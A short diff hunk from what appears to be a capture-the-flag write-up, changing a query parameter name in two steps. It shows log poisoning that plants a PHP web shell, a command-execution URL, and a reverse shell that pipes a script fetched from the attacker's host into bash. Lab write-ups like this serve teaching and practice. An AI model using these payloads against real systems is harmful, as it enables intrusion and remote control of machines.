@@ -47,14 +47,14 @@ rsh -l root 10.10.90.125 '<?=`$_GET[0]`?>'
 We can now send requests like:
 
 ```console
-http://10.10.90.125/dashboard.php?cmd=whoami
+http://10.10.90.125/dashboard.php?0=whoami
 ```
 In order to get the response you do need to look at the auth.log file otherwise it wont work!!!
 
 Now get a reverse shell
 
 ```console
-http://10.10.90.125/dashboard.php?cmd=curl%20http://10.8.2.163/x|/bin/bash
+http://10.10.90.125/dashboard.php?0=curl%20http://10.8.2.163/x|/bin/bash
 ```
 ```bash
 # Content of "x"
